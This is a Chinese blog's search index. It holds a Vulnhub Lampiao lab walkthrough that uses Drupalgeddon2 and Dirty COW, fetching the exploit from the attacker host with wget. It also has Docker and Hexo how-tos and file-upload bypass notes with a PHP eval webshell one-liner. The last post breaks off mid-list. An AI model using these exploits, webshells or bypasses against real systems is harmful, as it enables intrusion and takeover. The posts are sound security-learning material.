<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Lampiao</title>
    <url>/2021/05/24/Lampiao/</url>
    <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><p><img src="/2021/05/24/Lampiao/image-20210519163046106.png" alt="image-20210519163046106"></p>
<p>前提信息：</p>
<p>kali <code>192.168.229.129</code></p>
<p>Lampiao未知</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.299.0&#x2F;24</span><br><span class="line">&#x2F;&#x2F; 扫描192.168.229网段下的所有主机</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210519164912383.png" alt="image-20210519164912383"></p>
<p>起始ip为192.168.229.1，结束ip为192.168.229.254，而kali ip为192.168.229.129，所以靶机ip就是192.168.229.135</p>
<blockquote>
<p>192.168.229.1为虚拟网卡地址</p>
<p>192.168.229.2是虚拟网卡网关地址</p>
</blockquote>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.229.135 -p 1-65535</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210519170419899.png" alt="image-20210519170419899"></p>
<p>扫描出了22、80、1898端口</p>
<p>22端口进行ssh弱口令爆破</p>
<blockquote>
<p>具体操作可以使用<code>msf</code>或是<code>hydra</code>进行爆破</p>
</blockquote>
<p>80端口<code>It&#39;s easy Fidumaegud!</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210519170704797.png" alt="image-20210519170704797"></p>
<p>1898端口是一个博客的登录界面</p>
<p><img src="/2021/05/24/Lampiao/image-20210519171331868.png" alt="image-20210519171331868"></p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>使用工具<code>nikto</code>或是<code>dirb</code></p>
<blockquote>
<p>nikto是一款web漏洞扫描工具</p>
<p>dirb是web目录扫描工具</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;192.168.229.135:1898</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210522115857417.png" alt="image-20210522115857417"></p>
<p><img src="/2021/05/24/Lampiao/image-20210522115927983.png" alt="image-20210522115927983"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.229.135:1898</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210522115825431.png" alt="image-20210522115825431"></p>
<p><img src="/2021/05/24/Lampiao/image-20210522120000875.png" alt="image-20210522120000875"></p>
<h3 id="存在敏感信息泄露"><a href="#存在敏感信息泄露" class="headerlink" title="存在敏感信息泄露"></a>存在<strong>敏感信息泄露</strong></h3><p>访问<code>includes</code>目录</p>
<p><img src="/2021/05/24/Lampiao/image-20210522203456574.png" alt="image-20210522203456574"></p>
<p>发现存在<code>robots.txt</code>文件</p>
<p>访问<code>robots.txt</code>目录</p>
<p><img src="/2021/05/24/Lampiao/image-20210522234134580.png" alt="image-20210522234134580"></p>
<p>在<code>profiles/README.txt</code>文件中会发现cms是<code>drupal</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210522212104924.png" alt="image-20210522212104924"></p>
<p>在<code>CHANGELOG.txt</code>文件中发现<code>drupal</code>版本为7.54，更新时间为<code>2017-02-01</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523103734866.png" alt="image-20210523103734866"></p>
<p>百度查找<code>drupal</code>漏洞</p>
<p><img src="/2021/05/24/Lampiao/image-20210523103946363.png" alt="image-20210523103946363"></p>
<p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">漏洞分析</a></p>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><h4 id="search-drupal"><a href="#search-drupal" class="headerlink" title="search drupal"></a><code>search drupal</code></h4><p>搜索相应漏洞</p>
<p><img src="/2021/05/24/Lampiao/image-20210523104844441.png" alt="image-20210523104844441"></p>
<p>在<code>2018-03-28</code>drupal爆出一个RCE，CVE编号为CVE-2018-7600</p>
<h4 id="show-options"><a href="#show-options" class="headerlink" title="show options"></a><code>show options</code></h4><p><img src="/2021/05/24/Lampiao/image-20210523110539063.png" alt="image-20210523110539063"></p>
<h4 id="use-exploit-unix-webapp-drupal-drupalgeddon2"><a href="#use-exploit-unix-webapp-drupal-drupalgeddon2" class="headerlink" title="use exploit/unix/webapp/drupal_drupalgeddon2"></a>use exploit/unix/webapp/drupal_drupalgeddon2</h4><h4 id="set-rhosts-192-168-229-135"><a href="#set-rhosts-192-168-229-135" class="headerlink" title="set rhosts 192.168.229.135"></a>set rhosts 192.168.229.135</h4><h4 id="set-rport-1898"><a href="#set-rport-1898" class="headerlink" title="set rport 1898"></a>set rport 1898</h4><h4 id="show-targets"><a href="#show-targets" class="headerlink" title="show targets"></a>show targets</h4><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p><img src="/2021/05/24/Lampiao/image-20210523110617795.png" alt="image-20210523110617795"></p>
<h4 id="获取到会话"><a href="#获取到会话" class="headerlink" title="获取到会话"></a>获取到会话</h4><p><img src="/2021/05/24/Lampiao/image-20210523112127404.png" alt="image-20210523112127404"></p>
<h4 id="交互式命令"><a href="#交互式命令" class="headerlink" title="交互式命令"></a>交互式命令</h4><blockquote>
<p>执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，</p>
<p>命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>//切换到/bin/bash</p>
</blockquote>
<h3 id="查看文件及其权限"><a href="#查看文件及其权限" class="headerlink" title="查看文件及其权限"></a>查看文件及其权限</h3><p><code>ls -li</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523162343113.png" alt="image-20210523162343113"></p>
<p>发现两个音频文件，两张图片</p>
<p>下载<code>audio.m4a</code>会朗读:<code>user t-i-a-g-o</code>有一说一没有听出来emmmm</p>
<blockquote>
<p>用户名可能是<code>tiago</code></p>
</blockquote>
<p>而图片<code>qrc.png</code>是一个二维码，内容是：<code>Try harder!muahuahua</code></p>
<p>另外的图片和音频并没有发现有用信息</p>
<blockquote>
<p>还是对站点的信息收集不够全面，其实在1898端口那个界面就能发现一些猫腻</p>
<p>两个文章的url分别是：<code>http://192.168.229.135:1898/?q=node/1</code>和<code>http://192.168.229.135:1898/?q=node/3</code>唯独没有<code>/?q=node/2</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523165940420.png" alt="image-20210523165940420"></p>
<p>访问会发现两个重要的信息<code>audio.m4a</code>和<code>qrc.png</code></p>
</blockquote>
<h3 id="查看账号信息"><a href="#查看账号信息" class="headerlink" title="查看账号信息"></a>查看账号信息</h3><p><code>cat /etc/passwd</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523160700792.png" alt="image-20210523160700792"></p>
<h3 id="查看操作系统和内核版本"><a href="#查看操作系统和内核版本" class="headerlink" title="查看操作系统和内核版本"></a>查看操作系统和内核版本</h3><p><code>uname -a</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523160928039.png" alt="image-20210523160928039"></p>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>权限是低权限www-data用户，需要提权</p>
<h3 id="脏牛（Dirty-COW）"><a href="#脏牛（Dirty-COW）" class="headerlink" title="脏牛（Dirty COW）"></a>脏牛（Dirty COW）</h3><p><img src="/2021/05/24/Lampiao/t017c4bda502a18a05c.png" alt="t017c4bda502a18a05c"></p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Linux内核&gt;=2.6.22</strong> （2007年发行）开始就受影响了，直到2016年10月18日才修复</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p>
<h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><blockquote>
<p>get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的</p>
</blockquote>
<h3 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h3><p><code>Lampiao</code>内核版本为<code>4.4.0</code></p>
<p>可以去网上搜索exp或是直接使用kali中自带的<code>searchsploit</code></p>
<h4 id="searchsploit-dirty"><a href="#searchsploit-dirty" class="headerlink" title="searchsploit dirty"></a><code>searchsploit dirty</code></h4><p><img src="/2021/05/24/Lampiao/image-20210524091130922.png" alt="image-20210524091130922"></p>
<h4 id="cp复制到本地"><a href="#cp复制到本地" class="headerlink" title="cp复制到本地"></a>cp复制到本地</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/40847.cpp ~</span><br><span class="line">python -m SimpleHTTPServer 5555</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里一开始是在root权限下，复制的文件也在/root目录下，以至于在使用python开启5555端口的服务时靶机并不能下载该文件</p>
<p>解决：切换到<code>user</code>用户下重新下载即可</p>
</blockquote>
<p><img src="/2021/05/24/Lampiao/image-20210524094133696.png" alt="image-20210524094133696"></p>
<p><img src="/2021/05/24/Lampiao/image-20210524093919689.png" alt="image-20210524093919689"></p>
<h4 id="下载kali的40847-cpp"><a href="#下载kali的40847-cpp" class="headerlink" title="下载kali的40847.cpp"></a>下载kali的<code>40847.cpp</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.229.129:5555/40847.cpp</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/24/Lampiao/image-20210524094802217.png" alt="下载失败"></p>
<p><img src="/2021/05/24/Lampiao/image-20210524095054903.png" alt="image-20210524095054903"></p>
<h4 id="执行gcc编译可执行文件，可直接提权"><a href="#执行gcc编译可执行文件，可直接提权" class="headerlink" title="执行gcc编译可执行文件，可直接提权"></a>执行gcc编译可执行文件，可直接提权</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数分析：</p>
<p>参数分析</p>
<p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std=c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow</p>
</blockquote>
<p><img src="/2021/05/24/Lampiao/image-20210524095337436.png" alt="image-20210524095337436"></p>
<h4 id="查看-40847"><a href="#查看-40847" class="headerlink" title="查看./40847"></a>查看<code>./40847</code></h4><p><img src="/2021/05/24/Lampiao/image-20210524095406136.png" alt="image-20210524095406136"></p>
<h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p><img src="/2021/05/24/Lampiao/image-20210524213622884.png" alt="image-20210524213622884"></p>
<h4 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到<code>flag</code></h4><blockquote>
<p>第一次刷vulnhub靶机，可以说是完完全全参考大佬们的博客进行的，真的很水，不过也学到了许多干货，争取下个靶机可以先自己来刷</p>
<p>wuwuwu我是fw</p>
</blockquote>
<h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>在<code>/var/www/html/sites/default/settings.php</code>存在敏感信息</p>
<p><img src="/2021/05/24/Lampiao/image-20210524221756239.png" alt="image-20210524221756239"></p>
<p>结合用户名<code>tiago</code>，当使用密码为<code>Virgulino</code>可以成功提权为<code>tiago</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210524222146058.png" alt="image-20210524222146058"></p>
<p>在获取到开发22端口的信息后，可以使用工具进行弱口令爆破emmmm不过暂时还没有总结，附上大佬们的一些工具和流程</p>
<blockquote>
<p>cewl：通过爬行网站获取关键信息创建一个密码字典<br>hydra：神器九头蛇，网上有太多资料</p>
<p>先利用cewl来生成一份结合网站目标的社工性质的密码字典、不理解的可以搜索网上搜索cewl学习，然后九头蛇暴力破解得到用户密码</p>
</blockquote>
<h2 id="知识点总结："><a href="#知识点总结：" class="headerlink" title="知识点总结："></a>知识点总结：</h2><ul>
<li>信息收集</li>
</ul>
<blockquote>
<p>nmap -sP ip</p>
<p>nmap ip -p 1-63335</p>
<p>nikto -h <a href="http://ip/">http://ip</a></p>
<p>dirb <a href="http://ip/">http://ip</a></p>
</blockquote>
<ul>
<li>msf使用</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>脏牛提权</li>
</ul>
<blockquote>
<p>searchsploit dirty</p>
<p>cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~<br>python -m SimpleHTTPServer 5555</p>
<p>wget <a href="http://192.168.229.129:5555/40847.cpp">http://192.168.229.129:5555/40847.cpp</a></p>
<p>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</p>
<p>./40847</p>
</blockquote>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/2552">vulnhub|渗透测试lampiao</a></p>
<p><a href="https://blog.csdn.net/qq_34801745/article/details/103731088">VulnHub-Lampiao-Walkthrough渗透学习</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/89353276">Vulnhub之路Ⅰ——Lampiao</a></p>
<p><a href="http://blog.leanote.com/post/snowming/f9e7fcdb4afb">记一次 Drupal + 脏牛提权 Ubuntu </a></p>
<p><a href="https://www.jianshu.com/p/df72d1ee1e3e">脏牛Linux本地提权漏洞复现(CVE-2016-5195)</a></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>docker基本使用</title>
    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>


<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>


<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/images.png" alt="image-20210417215354480"></p>
<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数解释：</p>
<p>-d 镜像在后台运行</p>
<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
</blockquote>
<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/run.png" alt="image-20210417222849702"></p>
<blockquote>
<p>请注意这张图片中的容器端口8801是错误的</p>
</blockquote>
<p>但是会报错，是因为没有开启ipv4转发</p>
<blockquote>
<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
</blockquote>
<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/net.ipv4.png" alt="image-20210417222634372"></p>
<p>重启服务并查看修改是否成功</p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/%E6%9F%A5%E7%9C%8B.png" alt="image-20210417222728689"></p>
<blockquote>
<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
</blockquote>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E7%95%8C%E9%9D%A2.png" alt="image-20210418160119935"></p>
<blockquote>
<p>成功访问</p>
</blockquote>
<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/ps.png" alt="image-20210417223707346"></p>
<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/exec.png" alt="image-20210417223949376"></p>
<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E9%85%8D%E7%BD%AE.png" alt="image-20210418160159989"></p>
<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
<blockquote>
<p>删除容器和镜像时需要注意的是：</p>
<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
</blockquote>
<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo初使用</title>
    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
</blockquote>
<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
<li>Node.js</li>
<li>git</li>
<li>hexo</li>
<li>GitHub账号</li>
</ul>
<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
<p>配置全局变量,并生成密钥</p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
<blockquote>
<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
</blockquote>
<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
<li>npm install hexo-deployer-git –save</li>
</ul>
<blockquote>
<p>要在博客目录下右键git bash运行</p>
</blockquote>
<ul>
<li>hexo clean （清除缓存和静态文件）</li>
<li>hexo g （生成静态文件）</li>
<li>hexo d （部署）</li>
</ul>
<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
<blockquote>
<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
</blockquote>
<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
<ul>
<li>安装插件</li>
<li>_config.yml选项设置</li>
<li>使用相对路径</li>
</ul>
<blockquote>
<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
</blockquote>
<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传知识点总结</title>
    <url>/2021/05/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
<p>.htacess的Apache解析漏洞</p>
<p>配合文件包含，图片马</p>
<p>条件竞争</p>
</blockquote>
<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
<li>MIME</li>
</ol>
<p>绕过：burp修改文件头content-type字段为image/gif</p>
<ol start="2">
<li>文件内容头</li>
</ol>
<p>在<img src alt="img">马之前加上一些图片信息，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>


<ol>
<li>文件扩展名校验（白名单，黑名单）</li>
<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
</ol>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
<li><strong>大小写、双写</strong>绕过pphphp</li>
<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
</ol>
<ul>
<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
</ul>
<blockquote>
<p>.htaccess是Apache的</p>
</blockquote>
<ol start="4">
<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
</li>
<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
</li>
</ol>
<blockquote>
<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
</blockquote>
<ol start="6">
<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
</ol>
<blockquote>
<ul>
<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
<li>截断条件：</li>
</ul>
<p><em>php &lt; 5.3.4</em></p>
<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
<ul>
<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
</ul>
</blockquote>
<ol start="7">
<li>🔲配合<strong>文件包含</strong>使用</li>
</ol>
<blockquote>
<p>上传<strong>图片马</strong></p>
<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
<p>进行文件包含</p>
</blockquote>
<ol start="8">
<li>🔲<strong>条件竞争</strong></li>
</ol>
<blockquote>
<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
<p>具体实例可见upload-labs pass17、18</p>
<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
